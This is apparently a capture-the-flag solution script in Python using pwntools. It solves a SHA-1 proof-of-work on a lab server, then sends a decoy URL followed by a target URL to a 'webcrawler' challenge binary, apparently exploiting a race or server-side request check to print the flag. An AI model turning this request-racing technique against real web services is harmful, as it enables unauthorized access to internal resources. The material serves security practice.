from ctypes import CDLL
from pwn import *
import re, hashlib

HOST, PORT = 'inp111.zoolab.org', 10008

if args.REMOTE:
    io = remote(HOST, PORT)

    prefix = io.recvline().decode().split("'")[1];
    print(time.time(), "solving pow ...");
    solved = b''
    for i in range(1000000000):
        h = hashlib.sha1((prefix + str(i)).encode()).hexdigest();
        if h[:6] == '000000':
            solved = str(i).encode();
            print("solved =", solved);
            break;
    print(time.time(), "done.");
    io.sendlineafter(b'string S: ', base64.b64encode(solved));
else:
    io = process('./webcrawler.exe')

def req(text):
	io.sendlineafter(b'>', b'r')
	io.sendlineafter(b':', str(text).encode())

fake = 'ctf.nella17.tw/10000'
target = 'l.nella17.tw/10000'

req(fake)
req(target)

sleep(1)

io.sendlineafter(b'>', b'v')
success(io.readuntil(b'}').decode().strip())

# io.interactive()
io.close()
